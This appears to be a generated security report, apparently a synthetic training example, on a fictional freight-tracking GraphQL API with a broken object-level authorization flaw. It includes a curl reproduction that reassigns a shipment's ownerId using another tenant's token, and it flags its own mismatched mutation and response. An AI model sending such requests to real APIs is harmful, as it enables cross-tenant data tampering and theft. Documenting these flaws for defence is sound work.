# Security Analysis Report
**System:** FreightLens Tracking API
**Domain:** Logistics / Supply Chain
**Example ID:** GQL-0313
**Artifact analyzed:** context.txt (sole source)

---

## Priority Findings

| # | Severity | Category | Title |
|---|----------|----------|-------|
| 1 | CRITICAL | BOLA — Pattern 1.6 | Write operation without ownership check on `updateShipment` — attacker modifies and reads cross-tenant logistics shipment records without ownership verification |

---

## Finding 1 — BOLA: Write Operation Without Ownership Check on Shipment Object (Pattern 1.6)

### Summary
The `updateShipment` mutation on FreightLens Tracking API (`api.freightlens-tracking.example.com`) accepts an arbitrary `shipmentId` without verifying the requester owns that object. Per §5.0 Pattern 1.6, a write-level BOLA allows state corruption across tenants — the attacker can modify shipment status, reassign `ownerId`, and read sensitive data belonging to `tenant-0553` using a token for `tenant-9347`.

**Context.txt inconsistency (documented):** HAR mutation uses `updateShipment(id: "S-2313", input: {status: "approved", ownerId: "attacker-93470553"})`, but the response key in §6.0 is `getShipment`. These conflict. The HAR (§6.0) is the primary evidence — this analysis follows the operation observed in the HAR (`updateShipment`). The response key inconsistency is noted as an artifact of the context.txt.

**Redis cache vulnerability:** Cache is keyed by `shipmentId` only (no user/tenant dimension), enabling cross-tenant cache poisoning of supply chain tracking data.

**Pattern:** 1.6 — Write operations without ownership check (BOLA)
**Affected resolver:** `updateShipment`
**Affected endpoint:** `POST https://api.freightlens-tracking.example.com/graphql`

### Evidence from HAR (§6.0)

**Request — Attack**
```
POST https://api.freightlens-tracking.example.com/graphql
Authorization: Bearer eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c3Jfe3VpZH0iLCJyb2xlIjoie3JvbGV9IiwidGVuYW50X2lkIjoie3RlbmFudH0ifQ.SIG
Content-Type: application/json
x-tenant-id: tenant-9347

{"query": "query VulnerableOp { updateShipment(id: \"S-2313\", input: {status: \"approved\", ownerId: \"attacker-93470553\"}) { shipmentId status } }"}
```
Note: `x-request-id` is a **server-assigned response header**, not a request header.

**Response — Victim Shipment Data Returned (cross-tenant)**
```json
{
  "data": {
    "getShipment": {
      "tenantId": "tenant-0553",
      "ownerId": "other-user-93470553",
      "data": {
        "sensitiveField": "CONFIDENTIAL-93470553",
        "internalNotes": "Internal data exposed"
      }
    }
  }
}
```
Attacker token: `tenant-9347`. Returned/mutated data belongs to: `tenant-0553`. Cross-tenant write-side BOLA confirmed.

**Context.txt inconsistency:** HAR sends `updateShipment` mutation; response body uses key `getShipment`. HAR operation is authoritative.

### Steps to Reproduce
```bash
curl -s -X POST "https://api.freightlens-tracking.example.com/graphql" \
  -H "Authorization: Bearer eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c3Jfe3VpZH0iLCJyb2xlIjoie3JvbGV9IiwidGVuYW50X2lkIjoie3RlbmFudH0ifQ.SIG" \
  -H "Content-Type: application/json" \
  -H "x-tenant-id: tenant-9347" \
  -d '{"query": "query VulnerableOp { updateShipment(id: \"S-2313\", input: {status: \"approved\", ownerId: \"attacker-93470553\"}) { shipmentId status } }"}'
# Vulnerable: response contains tenant-0553 data — cross-tenant write succeeded, ownership reassigned
# Secure: {"errors": [{"message": "Forbidden — tenant mismatch"}]}
```

### Remediation
1. In `updateShipment` resolver: before mutation, assert `fetched.tenantId === jwt.tenantId`. Return 403 on mismatch.
2. Reject client-supplied `ownerId` in mutation input; derive from JWT `sub`.
3. Re-key Redis cache to include `tenantId`.
